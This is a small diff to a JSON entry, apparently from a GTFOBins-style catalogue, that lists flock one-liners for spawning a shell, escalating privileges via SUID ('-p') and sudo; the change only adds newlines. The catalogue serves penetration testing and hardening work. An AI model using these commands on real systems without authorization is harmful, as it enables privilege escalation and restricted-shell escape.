@@ -2,17 +2,20 @@
   "functions": {
     "shell": [
       {
-        "code": "flock -u / /bin/sh"
+        
+        "code": "flock -u / /bin/sh\n"
       }
     ],
     "suid": [
       {
-        "code": "./flock -u / /bin/sh -p"
+        
+        "code": "./flock -u / /bin/sh -p\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo flock -u / /bin/sh"
+        
+        "code": "sudo flock -u / /bin/sh\n"
       }
     ]
   }
